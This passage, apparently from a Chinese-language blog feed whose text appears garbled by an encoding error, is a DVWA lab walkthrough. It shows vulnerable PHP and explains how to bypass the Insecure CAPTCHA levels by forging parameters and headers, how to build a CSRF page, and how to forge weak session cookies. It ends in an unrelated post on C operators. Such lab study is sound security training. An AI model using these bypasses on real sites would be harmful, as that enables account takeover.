$___mysqli_res);}?&gt;</code></pre><p>å¯ä»¥çœ‹åˆ°ï¼ŒæœåŠ¡å™¨å°†æ”¹å¯†æ“ä½œåˆ†æˆäº†ä¸¤æ­¥ï¼Œç¬¬ä¸€æ­¥æ£€æŸ¥ç”¨æˆ·è¾“å…¥çš„éªŒè¯ç ï¼ŒéªŒè¯é€šè¿‡åŽï¼ŒæœåŠ¡å™¨è¿”å›žè¡¨å•ï¼Œç¬¬äºŒæ­¥å®¢æˆ·ç«¯æäº¤postè¯·æ±‚ï¼ŒæœåŠ¡å™¨å®Œæˆæ›´æ”¹å¯†ç çš„æ“ä½œã€‚ä½†æ˜¯ï¼Œè¿™å…¶ä¸­å­˜åœ¨æ˜Žæ˜¾çš„é€»è¾‘æ¼æ´žï¼ŒæœåŠ¡å™¨ä»…ä»…é€šè¿‡æ£€æŸ¥Changeã€step å‚æ•°æ¥åˆ¤æ–­ç”¨æˆ·æ˜¯å¦å·²ç»è¾“å…¥äº†æ­£ç¡®çš„éªŒè¯ç ã€‚</p><p><strong>1.é€šè¿‡æž„é€ å‚æ•°ç»•è¿‡éªŒè¯è¿‡ç¨‹çš„ç¬¬ä¸€æ­¥</strong></p><p>é¦–å…ˆè¾“å…¥å¯†ç ï¼Œç‚¹å‡»ChangeæŒ‰é’®ï¼ŒæŠ“åŒ…ï¼š</p><p><img src="/2021/07/16/dvwa/blog/source_posts\DVWA\1375459-20200424102955500-586208657.png" alt="1375459-20200424102955500-586208657"></p><p>æ›´æ”¹stepå‚æ•°ç»•è¿‡éªŒè¯ç </p><p><img src="/2021/07/16/dvwa/blog/source_posts\DVWA\1375459-20200424103056556-345258237.png" alt="1375459-20200424103056556-345258237"></p><p>ä¿®æ”¹å¯†ç æˆåŠŸ<img src="/2021/07/16/dvwa/blog/source_posts\DVWA\1375459-20200424102602206-758466382.png" alt="1375459-20200424102602206-758466382"></p><p><strong>2.ç”±äºŽæ²¡æœ‰ä»»ä½•çš„é˜²CSRFæœºåˆ¶ï¼Œæˆ‘ä»¬å¯ä»¥è½»æ˜“åœ°æž„é€ æ”»å‡»é¡µé¢</strong><img src="/2021/07/16/dvwa/blog/source_posts\DVWA\1375459-20200424103739253-2010034458.png" alt="1375459-20200424103739253-2010034458"></p><p>å½“å—å®³è€…è®¿é—®è¿™ä¸ªé¡µé¢æ—¶ï¼Œæ”»å‡»è„šæœ¬ä¼šä¼ªé€ æ”¹å¯†è¯·æ±‚å‘é€ç»™æœåŠ¡å™¨ã€‚<img src="/2021/07/16/dvwa/blog/source_posts\DVWA\1375459-20200424103812914-454750515.png" alt="1375459-20200424103812914-454750515"></p><p>å—å®³è€…ä¼šçœ‹åˆ°æ›´æ”¹å¯†ç æˆåŠŸçš„ç•Œé¢</p><h2 id="Medium-4"><a href="#Medium-4" class="headerlink" title="Medium"></a>Medium</h2><pre><code>&lt;?phpif( isset( $_POST[ 'Change' ] ) &amp;&amp; ( $_POST[ 'step' ] == '1' ) ) {    // Hide the CAPTCHA form    $hide_form = true;    // Get input    $pass_new  = $_POST[ 'password_new' ];    $pass_conf = $_POST[ 'password_conf' ];    // Check CAPTCHA from 3rd party    $resp = recaptcha_check_answer(        $_DVWA[ 'recaptcha_private_key' ],        $_POST['g-recaptcha-response']    );    // Did the CAPTCHA fail?    if( !$resp ) {        // What happens when the CAPTCHA was entered incorrectly        $html     .= "&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;";        $hide_form = false;        return;    }    else {        // CAPTCHA was correct. Do both new passwords match?        if( $pass_new == $pass_conf ) {            // Show next stage for the user            $html .= "                &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt;                &lt;form action=\"#\" method=\"POST\"&gt;                    &lt;input type=\"hidden\" name=\"step\" value=\"2\" /&gt;                    &lt;input type=\"hidden\" name=\"password_new\" value=\"{$pass_new}\" /&gt;                    &lt;input type=\"hidden\" name=\"password_conf\" value=\"{$pass_conf}\" /&gt;                    &lt;input type=\"hidden\" name=\"passed_captcha\" value=\"true\" /&gt;                    &lt;input type=\"submit\" name=\"Change\" value=\"Change\" /&gt;                &lt;/form&gt;";        }        else {            // Both new passwords do not match.            $html     .= "&lt;pre&gt;Both passwords must match.&lt;/pre&gt;";            $hide_form = false;        }    }}if( isset( $_POST[ 'Change' ] ) &amp;&amp; ( $_POST[ 'step' ] == '2' ) ) {    // Hide the CAPTCHA form    $hide_form = true;    // Get input    $pass_new  = $_POST[ 'password_new' ];    $pass_conf = $_POST[ 'password_conf' ];    // Check to see if they did stage 1----æ£€æŸ¥passed_captchaå‚æ•°å€¼    if( !$_POST[ 'passed_captcha' ] ) {        $html     .= "&lt;pre&gt;&lt;br /&gt;You have not passed the CAPTCHA.&lt;/pre&gt;";        $hide_form = false;        return;    }    // Check to see if both password match    if( $pass_new == $pass_conf ) {        // They do!        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));        $pass_new = md5( $pass_new );        // Update database        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' );        // Feedback for the end user        $html .= "&lt;pre&gt;Password Changed.&lt;/pre&gt;";    }    else {        // Issue with the passwords matching        $html .= "&lt;pre&gt;Passwords did not match.&lt;/pre&gt;";        $hide_form = false;    }    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);}?&gt;</code></pre><p>å¯ä»¥çœ‹åˆ°ï¼ŒMediumçº§åˆ«çš„ä»£ç ä¾ç„¶å°†æ”¹å¯†æ“ä½œåˆ†æˆäº†ä¸¤æ­¥ï¼Œç¬¬ä¸€æ­¥æ£€æŸ¥ç”¨æˆ·è¾“å…¥çš„éªŒè¯ç ï¼ŒéªŒè¯é€šè¿‡åŽï¼ŒæœåŠ¡å™¨è¿”å›žè¡¨å•ï¼Œç¬¬äºŒæ­¥å®¢æˆ·ç«¯æäº¤postè¯·æ±‚ï¼ŒæœåŠ¡å™¨å®Œæˆæ›´æ”¹å¯†ç çš„æ“ä½œã€‚ä¸ŽLowçº§åˆ«ä¸åŒçš„æ˜¯ï¼Œåœ¨ç¬¬äºŒæ­¥éªŒè¯æ—¶ï¼Œå¢žåŠ äº†å¯¹å‚æ•°passed_captchaçš„æ£€æŸ¥ï¼Œå¦‚æžœå‚æ•°å€¼ä¸ºtrueï¼Œåˆ™è®¤ä¸ºç”¨æˆ·å·²ç»é€šè¿‡äº†éªŒè¯ç æ£€æŸ¥ï¼Œç„¶è€Œç”¨æˆ·ä¾ç„¶å¯ä»¥é€šè¿‡ä¼ªé€ å‚æ•°ç»•è¿‡éªŒè¯ï¼Œæœ¬è´¨ä¸Šæ¥è¯´ï¼Œè¿™ä¸ŽLowçº§åˆ«çš„éªŒè¯æ²¡æœ‰ä»»ä½•åŒºåˆ«ã€‚</p><p><strong>1.å¯ä»¥é€šè¿‡æŠ“åŒ…ï¼Œæ›´æ”¹stepå‚æ•°ï¼Œå¢žåŠ passed_captchaå‚æ•°ï¼Œç»•è¿‡éªŒè¯ç ã€‚</strong><img src="/2021/07/16/dvwa/blog/source_posts\DVWA\1375459-20200424104918595-2017076591.png" alt="1375459-20200424104918595-2017076591"></p><p>æ”¹äº†</p><p><img src="/2021/07/16/dvwa/blog/source_posts\DVWA\1375459-20200424105017920-2107330620.png" alt="1375459-20200424105017920-2107330620"></p><h2 id="High-4"><a href="#High-4" class="headerlink" title="High"></a>High</h2><pre><code>&lt;?phpif( isset( $_POST[ 'Change' ] ) ) {    // Hide the CAPTCHA form    $hide_form = true;    // Get input    $pass_new  = $_POST[ 'password_new' ];    $pass_conf = $_POST[ 'password_conf' ];    // Check CAPTCHA from 3rd party    $resp = recaptcha_check_answer(        $_DVWA[ 'recaptcha_private_key' ],        $_POST['g-recaptcha-response']    );//ï¼ˆé€šè¿‡èº«ä»½éªŒè¯æ¡ä»¶ï¼‰æˆ–è€… ï¼ˆå‚æ•°g-recaptcha-responä¸ºhidd3n_valu3å¹¶ä¸”å‚æ•° HTTP_USER_AGEä¸º reCAPTCï¼‰å°±ç®—æ˜¯éªŒè¯é€šè¿‡äº†    if (        $resp ||         (            $_POST[ 'g-recaptcha-response' ] == 'hidd3n_valu3'            &amp;&amp; $_SERVER[ 'HTTP_USER_AGENT' ] == 'reCAPTCHA'        )    ){        // CAPTCHA was correct. Do both new passwords match?        if ($pass_new == $pass_conf) {            $pass_new = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));            $pass_new = md5( $pass_new );            // Update database            $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "' LIMIT 1;";            $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' );            // Feedback for user            echo "&lt;pre&gt;Password Changed.&lt;/pre&gt;";        } else {            // Ops. Password mismatch            $html     .= "&lt;pre&gt;Both passwords must match.&lt;/pre&gt;";            $hide_form = false;        }    } else {        // What happens when the CAPTCHA was entered incorrectly        $html     .= "&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;";        $hide_form = false;        return;    }    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);}// Generate Anti-CSRF tokengenerateSessionToken();?&gt;</code></pre><p>å¯ä»¥çœ‹åˆ°ï¼ŒæœåŠ¡å™¨çš„éªŒè¯é€»è¾‘æ˜¯å½“$respï¼ˆè¿™é‡Œæ˜¯æŒ‡è°·æ­Œè¿”å›žçš„éªŒè¯ç»“æžœï¼‰æ˜¯trueï¼Œæˆ–è€… å‚æ•°g-recaptcha-responseç­‰äºŽhidd3n_valu3å¹¶ä¸”httpåŒ…å¤´çš„User-Agentå‚æ•°ç­‰äºŽreCAPTCHA æ—¶ï¼Œå°±è®¤ä¸ºéªŒè¯ç è¾“å…¥æ­£ç¡®ï¼Œé€šè¿‡äº†éªŒè¯ç çš„æ£€æŸ¥ã€‚</p><p>æžæ¸…æ¥šäº†éªŒè¯é€»è¾‘ï¼Œå‰©ä¸‹å°±æ˜¯ä¼ªé€ ç»•è¿‡äº†ï¼Œç”±äºŽ$respå‚æ•°æˆ‘ä»¬æ— æ³•æŽ§åˆ¶ï¼Œæ‰€ä»¥é‡å¿ƒæ”¾åœ¨å‚æ•°g-recaptcha-responseã€User-Agentä¸Šã€‚</p><p><img src="/2021/07/16/dvwa/blog/source_posts\DVWA\1375459-20200424110756298-1402975162.png" alt="1375459-20200424110756298-1402975162"></p><p>æ›´æ”¹å‚æ•°g-recaptcha-responseä»¥åŠhttpåŒ…å¤´çš„User-Agentï¼š</p><p><img src="/2021/07/16/dvwa/blog/source_posts\DVWA\1375459-20200424110945251-1429280531.png" alt="1375459-20200424110945251-1429280531"></p><h2 id="Impossible-4"><a href="#Impossible-4" class="headerlink" title="Impossible"></a>Impossible</h2><pre><code>&lt;?phpif( isset( $_POST[ 'Change' ] ) ) {    // Check Anti-CSRF token----tokenéªŒè¯    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );    // Hide the CAPTCHA form    $hide_form = true;    // Get input----å¯¹è¾“å…¥è¿›è¡Œè¿‡æ»¤ã€è½¬ä¹‰ã€md5    $pass_new  = $_POST[ 'password_new' ];    $pass_new  = stripslashes( $pass_new );    $pass_new  = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));    $pass_new  = md5( $pass_new );    $pass_conf = $_POST[ 'password_conf' ];    $pass_conf = stripslashes( $pass_conf );    $pass_conf = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_conf ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));    $pass_conf = md5( $pass_conf );    $pass_curr = $_POST[ 'password_current' ];    $pass_curr = stripslashes( $pass_curr );    $pass_curr = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_curr ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));    $pass_curr = md5( $pass_curr );    // Check CAPTCHA from 3rd party----ç¬¬ä¸‰æ–¹æ ¡éªŒéªŒè¯ç     $resp = recaptcha_check_answer(        $_DVWA[ 'recaptcha_private_key' ],        $_POST['g-recaptcha-response']    );    // Did the CAPTCHA fail?----ç¬¬ä¸€æ­¥ï¼šå¦‚æžœç¬¬ä¸‰æ–¹æ ¡éªŒéªŒè¯ç æ­£ç¡®ï¼Œè¿›è¡Œä¸‹ä¸€æ­¥    if( !$resp ) {        // What happens when the CAPTCHA was entered incorrectly        $html .= "&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;";        $hide_form = false;        return;    }    else {        // Check that the current password is correct----ç¬¬äºŒæ­¥ï¼šæ ¡éªŒå½“å‰å¯†ç æ˜¯å¦è¾“å…¥æ­£ç¡®        $data = $db-&gt;prepare( 'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );        $data-&gt;bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );        $data-&gt;bindParam( ':password', $pass_curr, PDO::PARAM_STR );        $data-&gt;execute();        // Do both new password match and was the current password correct?---ç¬¬ä¸‰æ­¥ï¼šå¦‚æžœæ–°å¯†ç å’Œç¡®è®¤å¯†ç ç›¸åŒï¼Œå¹¶ä¸”å½“å‰å¯†ç æ­£ç¡®ï¼Œè¿›è¡Œä¸‹ä¸€æ­¥        if( ( $pass_new == $pass_conf) &amp;&amp; ( $data-&gt;rowCount() == 1 ) ) {            // Update the database---ç¬¬å››æ­¥ï¼šæ›´æ–°å¯†ç             $data = $db-&gt;prepare( 'UPDATE users SET password = (:password) WHERE user = (:user);' );            $data-&gt;bindParam( ':password', $pass_new, PDO::PARAM_STR );            $data-&gt;bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );            $data-&gt;execute();            // Feedback for the end user - success!            $html .= "&lt;pre&gt;Password Changed.&lt;/pre&gt;";        }        else {            // Feedback for the end user - failed!            $html .= "&lt;pre&gt;Either your current password is incorrect or the new passwords did not match.&lt;br /&gt;Please try again.&lt;/pre&gt;";            $hide_form = false;        }    }}// Generate Anti-CSRF tokengenerateSessionToken();?&gt;</code></pre><p>å¯ä»¥çœ‹åˆ°ï¼ŒImpossibleçº§åˆ«çš„ä»£ç å¢žåŠ äº†Anti-CSRF token æœºåˆ¶é˜²å¾¡CSRFæ”»å‡»ï¼Œåˆ©ç”¨PDOæŠ€æœ¯é˜²æŠ¤sqlæ³¨å…¥ï¼ŒéªŒè¯è¿‡ç¨‹ç»ˆäºŽä¸å†åˆ†æˆä¸¤éƒ¨åˆ†äº†ï¼ŒéªŒè¯ç æ— æ³•ç»•è¿‡ï¼ŒåŒæ—¶è¦æ±‚ç”¨æˆ·è¾“å…¥ä¹‹å‰çš„å¯†ç ï¼Œè¿›ä¸€æ­¥åŠ å¼ºäº†èº«ä»½è®¤è¯ã€‚</p><h1 id="Weak-Session-IDsï¼ˆå¼±ä¼šè¯IDï¼‰"><a href="#Weak-Session-IDsï¼ˆå¼±ä¼šè¯IDï¼‰" class="headerlink" title="Weak Session IDsï¼ˆå¼±ä¼šè¯IDï¼‰"></a>Weak Session IDsï¼ˆå¼±ä¼šè¯IDï¼‰</h1><p><img src="/2021/07/16/dvwa/blog/source_posts\DVWA\20201115163154911.jpg" alt="20201115163154911"></p><h4 id="sessionåˆ©ç”¨å®žè´¨"><a href="#sessionåˆ©ç”¨å®žè´¨" class="headerlink" title="sessionåˆ©ç”¨å®žè´¨"></a>sessionåˆ©ç”¨å®žè´¨</h4><p>å½“ç”¨æˆ·ç™»é™†åŽï¼Œåœ¨æœåŠ¡å™¨ç«¯å°±ä¼šåˆ›å»ºä¸€ä¸ªä¼šè¯ï¼ˆSessionï¼‰ï¼ŒæŽ¥ç€è®¿é—®é¡µé¢çš„æ—¶å€™å°±ä¸ç”¨ç™»é™†ï¼Œåªéœ€è¦æºå¸¦SessionåŽ»è®¿é—®ã€‚SessionIDä½œä¸ºç‰¹å®šç”¨æˆ·è®¿é—®ç«™ç‚¹æ‰€éœ€çš„å”¯ä¸€å†…å®¹ã€‚å¦‚æžœèƒ½å¤Ÿè®¡ç®—æˆ–è½»æ˜“çŒœåˆ°è¯¥SessionIDï¼Œåˆ™æ”»å‡»è€…å°†å¯ä»¥è½»æ˜“èŽ·å–è®¿é—®æƒé™ï¼Œæ— éœ€ç™»å½•å¯†ç ç›´æŽ¥è¿›å…¥ç‰¹å®šç”¨æˆ·ç•Œé¢ï¼Œè¿›è€Œè¿›è¡Œå…¶ä»–æ“ä½œ,å¦‚XSSã€æ–‡ä»¶ä¸Šä¼ ç­‰ã€‚</p><h4 id="SessionåŠ«æŒ"><a href="#SessionåŠ«æŒ" class="headerlink" title="SessionåŠ«æŒ :"></a>SessionåŠ«æŒ :</h4><p>å°±æ˜¯ä¸€ç§é€šè¿‡çªƒå–ç”¨æˆ·SessionIDï¼Œä½¿ç”¨è¯¥SessionIDç™»å½•è¿›ç›®æ ‡è´¦æˆ·çš„æ”»å‡»æ–¹æ³•ï¼Œæ­¤æ—¶æ”»å‡»è€…å®žé™…ä¸Šæ˜¯ä½¿ç”¨äº†ç›®æ ‡è´¦æˆ·çš„æœ‰æ•ˆSessionã€‚å¦‚æžœSessionIDæ˜¯ä¿å­˜åœ¨Cookieä¸­çš„ï¼Œåˆ™è¿™ç§æ”»å‡»å¯ä»¥ç§°ä¸ºCookieåŠ«æŒã€‚SessionIDè¿˜å¯ä»¥ä¿å­˜åœ¨URLä¸­ï¼Œä½œä¸ºä¸€ä¸ªè¯·æ±‚çš„ä¸€ä¸ªå‚æ•°ï¼Œä½†æ˜¯è¿™ç§æ–¹å¼çš„å®‰å…¨æ€§éš¾ä»¥ç»å—è€ƒéªŒ</p><h2 id="Low-4"><a href="#Low-4" class="headerlink" title="Low"></a>Low</h2><pre><code>&lt;?php$html = "";if ($_SERVER['REQUEST_METHOD'] == "POST") {    if (!isset ($_SESSION['last_session_id'])) {        $_SESSION['last_session_id'] = 0;    }    //æ–°çš„session_idåŠ ä¸€    $_SESSION['last_session_id']++;    $cookie_value = $_SESSION['last_session_id'];    setcookie("dvwaSession", $cookie_value);}?&gt;</code></pre><p>å¯ä»¥çœ‹åˆ°ï¼ŒæœåŠ¡å™¨ç«¯å¯¹sessionidçš„ç”Ÿæˆç­–ç•¥éžå¸¸ç®€å•ï¼š</p><p>å¦‚æžœç”¨æˆ· SESSIONä¸­çš„ last_session_id ä¸å­˜åœ¨å°±è®¾ä¸º 0ï¼Œå­˜åœ¨å°±ç›´æŽ¥åœ¨åŽŸæ¥çš„åŸºç¡€ä¸ŠåŠ 1ã€‚</p><p>è¿™ç§æ˜¯è‚¯å®šä¸è¡Œçš„ã€‚å¤ªå®¹æ˜“è¢«äººä¼ªé€ ï¼Œè€Œä¸”ä¸èƒ½ä¿è¯æ¯ä¸ªäººçš„sessionæ˜¯ä¸ä¸€æ ·çš„ï¼Œå®¹æ˜“é€ æˆå†²çªã€‚</p><p>ç‚¹Generateï¼ŒæŒ‰F12æŸ¥çœ‹headersä¿¡æ¯ï¼Œå¯ä»¥çœ‹åˆ°</p><p>è¯·æ±‚å¤´</p><p>Cookie: dvwaSession=1; security=low; PHPSESSID:â€hm1dnto8dfos480282k229f3j3â€</p><p>å“åº”å¤´</p><p>Set-Cookie: dvwaSession=3</p><p><img src="/2021/07/16/dvwa/blog/source_posts\DVWA\æŸ¥çœ‹session_id.png" alt="æŸ¥çœ‹session_id"></p><p>åŒæ ·å¯ä»¥ä½¿ç”¨burpæŠ“åŒ…</p><p><img src="/2021/07/16/dvwa/blog/source_posts\DVWA\burpæŠ“cookie.png" alt="burpæŠ“cookie"></p><p>ç„¶åŽfirefox+hackbarä¿®æ”¹cookieï¼š</p><p><img src="/2021/07/16/dvwa/blog/source_posts\DVWA\hackbarä¿®æ”¹cookie.png" alt="hackbarä¿®æ”¹cookie"></p><p>æ²¡æœ‰è¾“å…¥ç”¨æˆ·åå¯†ç ï¼Œç›´æŽ¥è¿›æ¥ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬åªè¦çŒœåˆ°sessionIDï¼Œå°±ä¸€ç›´ç»•è¿‡ç”¨æˆ·åå¯†ç </p><h2 id="Medium-5"><a href="#Medium-5" class="headerlink" title="Medium"></a>Medium</h2><pre><code>&lt;?php$html = "";if ($_SERVER['REQUEST_METHOD'] == "POST") {    $cookie_value = time();    setcookie("dvwaSession", $cookie_value);}?&gt;</code></pre><p>ä»ŽæœåŠ¡å™¨ç«¯çš„ä»£ç æ¥çœ‹ï¼Œå°†SessionIDçš„å€¼æ”¹æˆäº†æœåŠ¡å™¨çš„å½“å‰æ—¶é—´ï¼Œçœ‹èµ·æ¥æ¯”lowçš„éšæœºäº†ç‚¹ï¼Œä½†æ˜¯ç»è¿‡è¿žç»­çš„æ”¶é›†åŽå°±å¾ˆå®¹æ˜“å‘çŽ°å…¶ä¸­çš„è§„å¾‹ã€‚çŸ¥é“æ—¶é—´é‚£æˆ‘ä»¬å°±å¯ä»¥éª—Aåœ¨æŸä¸ªæ—¶é—´ç‚¹è¿›è¡Œç‚¹å‡»ï¼Œç„¶åŽä½ åœ¨ä¸€ä¸ªå¤§æ¦‚çš„èŒƒå›´åŽ»è¯•è¯•ã€‚</p><p><img src="/2021/07/16/dvwa/blog/source_posts\DVWA\æŠ“åŒ….png" alt="æŠ“åŒ…"></p><p>dvwaSession=1615022375; security=medium; PHPSESSID=hm1dnto8dfos480282k229f3j3</p><p>åœ¨å¦ä¸€ä¸ªæµè§ˆå™¨ä¸Šè®¿é—®è¿™ä¸ªç½‘å€ï¼ŒæŠ“åŒ…ï¼Œæ·»åŠ Cookieå¦‚ä¸‹</p><p>dvwaSession=1615022400; security=medium; PHPSESSID=hm1dnto8dfos480282k229f3j3</p><p>ä½¿ç”¨æ—¶é—´æˆ³åœ¨çº¿æŸ¥è¯¢å·¥å…·å°±å¯ä»¥ä¼ªé€ å•¦</p><p><a href="https://tool.lu/timestamp/">https://tool.lu/timestamp/</a></p><h2 id="High-5"><a href="#High-5" class="headerlink" title="High"></a>High</h2><pre><code>&lt;?php$html = "";if ($_SERVER['REQUEST_METHOD'] == "POST") {    if (!isset ($_SESSION['last_session_id_high'])) {        $_SESSION['last_session_id_high'] = 0;    }    $_SESSION['last_session_id_high']++;    $cookie_value = md5($_SESSION['last_session_id_high']);    setcookie("dvwaSession", $cookie_value, time()+3600, "/vulnerabilities/weak_id/", $_SERVER['HTTP_HOST'], false, false);}?&gt;</code></pre><p>è¿™é‡Œå°†dvwaSessionçš„å€¼è¿›è¡Œäº†md5è®¡ç®—ï¼Œå¹¶ä¸”è¿˜è®¾ç½®äº†dvwaSessionçš„æœ‰æ•ˆæœŸè¿›ä¸€æ­¥å¢žåŠ å®‰å…¨æ€§ï¼Œä½†ä¸è¶³çš„æ˜¯æœ¬çº§ä¸Žä½Žçº§ä»£ç ä¸€æ ·ï¼Œéƒ½æ˜¯é€šè¿‡0å¼€å§‹ç´¯åŠ çš„ï¼Œè‹¥æœ‰ç»éªŒçš„äººåœ¨å¤šæ¬¡å°è¯•åŽï¼Œå¾ˆå®¹æ˜“çœ‹å‡ºæ¥å…¶ä¸­çš„è§„å¾‹ã€‚</p><p>![weakid high æŠ“åŒ…](D:\blog\source_posts\DVWA\weakid high æŠ“åŒ….png)</p><p>32ä½å­—ç¬¦ã€‚ç”±0-9å’Œa-fç»„æˆçŒœæƒ³åº”è¯¥æ˜¯MD5ï¼Œæ‹¿åˆ°ç½‘ç«™åŽ»è§£å¯†ï¼Œä¸º2ï¼Œå†æµ‹è¯•å‡ æ¬¡ï¼Œå‘çŽ°å°±æ˜¯å¦‚lowä¸€æ ·ä»Ž0å¼€å§‹æ¯æ¬¡åŠ 1ï¼Œç„¶åŽç»è¿‡MD5åŠ å¯†ï¼Œä½œä¸ºSessionIDã€‚ä¾æ—§åœ¨å¦ä¸€ä¸ªæµè§ˆå™¨ä¸Šè®¿é—®è¿™ä¸ªç½‘å€ï¼ŒæŠ“åŒ…ï¼Œæ·»åŠ ä¸ŠCookieã€‚æˆåŠŸè®¿é—®ã€‚</p><h2 id="Impossible-5"><a href="#Impossible-5" class="headerlink" title="Impossible"></a>Impossible</h2><pre><code>&lt;?php$html = "";if ($_SERVER['REQUEST_METHOD'] == "POST") {    $cookie_value = sha1(mt_rand() . time() . "Impossible");    setcookie("dvwaSession", $cookie_value, time()+3600, "/vulnerabilities/weak_id/", $_SERVER['HTTP_HOST'], true, true);}?&gt;</code></pre><p>Impossibleçº§åˆ«ä½¿ç”¨éšæœºæ•°+æ—¶é—´æˆ³+å›ºå®šå­—ç¬¦ä¸²ï¼ˆâ€Impossibleâ€ï¼‰è¿›è¡Œ sha1 è¿ç®—ï¼Œä½œä¸º session idï¼Œå‡ ä¹Žä¸å¯èƒ½è¢«ç ´è§£ã€‚</p><p>è€Œ tomcat çš„ session id å€¼ç”Ÿæˆçš„ç­–ç•¥ï¼Œæ˜¯ä¸€ä¸ªéšæœºæ•°+æ—¶é—´+ jvm çš„idå€¼ï¼ˆjvmçš„idå€¼ä¼šæ ¹æ®æœåŠ¡å™¨çš„ç¡¬ä»¶ä¿¡æ¯è®¡ç®—å¾—æ¥ï¼‰ï¼Œå¦‚æžœå‡ºçŽ°å†²çªå°±ä¼šå†ç”Ÿæˆä¸€ä¸ªã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>cè¯­è¨€ï¼šè¿ç®—ç¬¦å’Œè¡¨è¾¾å¼ï¼ˆ2ï¼‰</title>
      <link href="2021/07/16/c-yu-yan-yun-suan-fu-he-biao-da-shi-2/"/>
      <url>2021/07/16/c-yu-yan-yun-suan-fu-he-biao-da-shi-2/</url>
      
        <content type="html"><![CDATA[<p>äº”Â·ä½è¿ç®—ç¬¦å’Œä½è¿ç®—è¡¨è¾¾å¼</p><p>â€‹    æ“ä½œç¬¦  åç§°  ä¼˜å…ˆ  ç»“åˆ å¯¹è±¡</p><p>~  æŒ‰ä½å–å  1 â†  å•</p><p>ã€Š  æŒ‰ä½å·¦ç§»  2  â†’  åŒ</p><p>  ã€‹æŒ‰ä½å³ç§»  3  â†’  åŒ</p><p>&amp;  æŒ‰ä½ä¸Ž  4  â†’  åŒ</p><p>^  æŒ‰ä½å¼‚æˆ–  5  â†’  åŒ</p><p>|  æŒ‰ä½æˆ–  6 â†’  åŒ</p><p>1Â·æŒ‰ä½å–å</p><p>â€‹    ~  æ“ä½œæ•°</p><p>2Â·æŒ‰ä½ç§» </p><p>â€‹    æ“ä½œæ•°  ã€Šï¼ˆã€‹ï¼‰ å·¦ï¼ˆå³ï¼‰ç§»ä½æ•°</p><p>3Â·æŒ‰ä½ä¸Ž</p><p>â€‹    æ“ä½œæ•° 1&amp;æ“ä½œæ•°2</p><p>â€‹    å¦‚æžœæ“ä½œæ•°ç›¸åº”ä½æ•°éƒ½ä¸ºä¸€ï¼Œåˆ™è¯¥ä½ä¸ºä¸€å¦åˆ™ä¸ºé›¶</p><p>4Â·æŒ‰ä½å¼‚æˆ–è¿ç®—</p><p>â€‹    æ“ä½œæ•°1^æ“ä½œæ•°2</p><p>æ“ä½œæ•°ç›¸åº”ä½ç›¸åŒä¸º1 ç›¸å¼‚ä¸ºé›¶</p><p>5Â·æŒ‰ä½æˆ–</p><p>   æ“ä½œæ•°1|æ“ä½œæ•°2</p><p>æ“ä½œæ•°ç›¸åº”ä½å‡ä¸ºé›¶ä¸ºé›¶ å¦åˆ™ä¸ºä¸€</p><p>å…­Â·æ¡ä»¶è¿ç®—ç¬¦å’Œæ¡ä»¶è¡¨è¾¾å¼</p><p> åˆ¤å®šå¼ï¼Ÿè¡¨è¾¾å¼1ï¼šè¡¨è¾¾å¼2</p><p>ä¸‰ç›®è¿ç®—  è‡ªå·¦å‘å³</p><p>ä¸ƒÂ·é€—å·è¿ç®—ç¬¦å’Œé€—å·è¡¨è¾¾å¼</p><p>   è‡ªå·¦å‘å³ 